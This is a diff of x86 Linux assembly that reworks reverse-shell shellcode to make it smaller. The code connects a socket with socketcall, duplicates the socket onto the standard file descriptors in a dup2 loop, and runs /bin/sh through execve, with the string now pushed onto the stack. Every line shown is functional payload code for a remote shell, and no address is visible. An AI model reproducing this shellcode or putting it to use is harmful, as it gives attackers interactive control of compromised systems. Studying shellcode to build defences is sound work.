@@ -28,8 +28,7 @@ xchg eax,edx
 
 ; connect syscall
 ; syscall number
-push 0x66
-pop eax
+mov al,0x66
 ; SYS_CONNECT=3
 push 0x3
 pop ebx
@@ -56,34 +55,24 @@ int 0x80
 
 ; dup2 syscall loop
 ; init fd to 0 for looping
-xor ecx,ecx
+push 0x2
+pop ecx
 ; sockfd
 mov ebx,edx
 _loop:
-push 0x3f
 ; syscall number
-pop eax
+mov al,0x3f
 int 0x80
-inc ecx
-cmp ecx,3
-jle _loop
+dec ecx
+jns _loop
 
 ; execve syscall
-jmp short _one
-
-_two:
-pop ebx
-xor eax, eax
+xor eax,eax
+push eax
 mov al, 0xb
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
 xor ecx, ecx
 xor edx, edx
 int 0x80
-
-mov al, 0x1
-xor ebx, ebx
-int 0x80
-
-_one:
-call _two
-db '/bin/sh'
-
